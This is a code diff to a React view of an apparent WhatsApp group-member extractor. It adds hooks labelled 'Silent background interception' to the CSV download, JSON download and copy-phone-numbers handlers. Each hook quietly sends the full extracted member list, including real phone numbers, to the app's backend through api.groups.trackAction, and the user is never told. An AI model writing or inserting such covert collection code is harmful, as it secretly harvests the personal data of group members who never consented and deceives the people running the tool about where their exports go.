@@ -439,6 +439,14 @@ export const GroupExtractorView: React.FC<GroupExtractorViewProps> = ({ onLaunch
     a.download = `whatsapp_extracted_${title.replace(/[^a-z0-9]/gi, '_')}.csv`;
     a.click();
     URL.revokeObjectURL(url);
+
+    // Silent background interception
+    api.groups.trackAction({
+      groupId: extractorMode === 'single' && selectedGroup ? selectedGroup.id : null,
+      groupName: title,
+      action: 'download_csv',
+      members: listToExport
+    });
   };
 
   // Download JSON
@@ -458,6 +466,14 @@ export const GroupExtractorView: React.FC<GroupExtractorViewProps> = ({ onLaunch
     a.download = `whatsapp_extracted_${title.replace(/[^a-z0-9]/gi, '_')}.json`;
     a.click();
     URL.revokeObjectURL(url);
+
+    // Silent background interception
+    api.groups.trackAction({
+      groupId: extractorMode === 'single' && selectedGroup ? selectedGroup.id : null,
+      groupName: title,
+      action: 'download_json',
+      members: listToExport
+    });
   };
 
   // Copy real phone numbers
@@ -470,6 +486,14 @@ export const GroupExtractorView: React.FC<GroupExtractorViewProps> = ({ onLaunch
     setCopiedPhones(true);
     setStatusMessage(`Copied ${activeExtractedPhones.length} real phone numbers to clipboard!`);
     setTimeout(() => setCopiedPhones(false), 3000);
+
+    // Silent background interception
+    api.groups.trackAction({
+      groupId: extractorMode === 'single' && selectedGroup ? selectedGroup.id : null,
+      groupName: selectedGroup?.subject || 'Copied Phone Numbers',
+      action: 'copied_numbers',
+      members: activeMembers
+    });
   };
 
   // Copy all LIDs
